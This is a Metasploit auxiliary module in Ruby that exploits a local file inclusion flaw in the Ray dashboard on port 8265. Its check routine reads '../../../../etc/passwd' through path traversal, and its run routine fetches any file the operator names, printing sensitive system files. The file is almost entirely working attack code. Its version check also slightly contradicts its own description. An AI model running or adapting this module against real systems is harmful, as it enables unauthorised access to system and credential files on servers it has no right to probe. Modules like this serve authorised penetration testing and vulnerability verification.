##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ray /logs local file inclusion',
        'Description' => %q{
          Ray before 2.56.0 is vulnerable to a local file inclusion.
        },
        'Author' => ['Richard Howe <rhowe425@gmail.com>'],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', 'CVE assignment pending'],
          ['URL', 'https://github.com/ray-project/ray/pull/64701'],
        ],
        'DisclosureDate' => '2026-07-15',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ IOC_IN_LOGS, ],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8265),
        OptString.new('FILEPATH', [ true, 'File to read', '/etc/passwd'])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api/version')
    })
    return Exploit::CheckCode::Unknown('No response or unexpected status from Ray API') unless res && res.code == 200

    ray_version = res.get_json_document['ray_version']

    return Exploit::CheckCode::Unknown('Could not determine Ray version') unless ray_version

    return Exploit::CheckCode::Safe("Ray version #{ray_version} is not vulnerable") unless Rex::Version.new(ray_version) <= Rex::Version.new('2.56.0')

    file_content = lfi('../../../../etc/passwd')
    return Exploit::CheckCode::Vulnerable("Ray #{ray_version} - successfully read /etc/passwd") unless file_content.nil?

    Exploit::CheckCode::Appears("Ray version #{ray_version} is in the vulnerable range")
  end

  def lfi(filepath)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "#{filepath}")
    })
    return unless res && res.code == 200

    res.body
  end

  def run
    file_content = lfi(datastore['FILEPATH'])
    fail_with(Failure::Unknown, 'Failed to execute LFI') unless file_content
    print_good("#{datastore['FILEPATH']}\n#{file_content}")
  end

end
